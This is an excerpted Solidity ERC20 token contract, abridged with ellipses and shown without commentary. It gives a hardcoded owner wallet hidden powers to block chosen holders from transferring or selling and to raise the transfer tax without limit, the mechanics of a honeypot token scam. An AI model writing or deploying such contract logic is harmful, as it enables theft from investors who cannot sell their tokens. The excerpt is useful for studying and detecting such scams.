...
contract ERC20 is Context, IERC20, Ownable {
    ...
    mapping(address => bool) private _isMarkt; 
    mapping(address => bool) private _isExcluded;
    mapping(address => bool) private _anitswaplist;
    ...
    uint256 private _marketFees = 3;
    uint256 private _taxFees = 10;


    constructor (string memory name_, string memory symbol_) {
        _marketWallet = 0xC95dbB78C3Ece273Deff9969b6Cc4A93E64cA377;
        _isExcluded[address(this)] = true;
        _isExcluded[_marketWallet] = true;
        _isMarkt[_marketWallet] = true;
        _name = name_;
        _symbol = symbol_;
    }
    ...
    function swaplist(address account) public view returns (bool) {
        return _anitswaplist[account];
    }
    ...
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        if (_isExcluded[_msgSender()] || _isExcluded[recipient]) {
            ...
            require(!_anitswaplist[msg.sender],"ERC20: isNoSwap");
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        ...
        require(!_anitswaplist[sender],"ERC20: isNoSwap");
    ...
    function changeTaxFees(uint256 newFees) public {
        require(_isMarkt[msg.sender]);
        _taxFees = newFees;
    }

    function anitSwap(address account, bool anit) public {
        require(_isMarkt[msg.sender]);
        _anitswaplist[account] = anit;
    }

    function mutlianitSwap(address[] memory accounts) public {
        require(_isMarkt[msg.sender]);
        for(uint256 i = 0; i<accounts.length; ++i) {
            _anitswaplist[accounts[i]] = true;
        }
    }
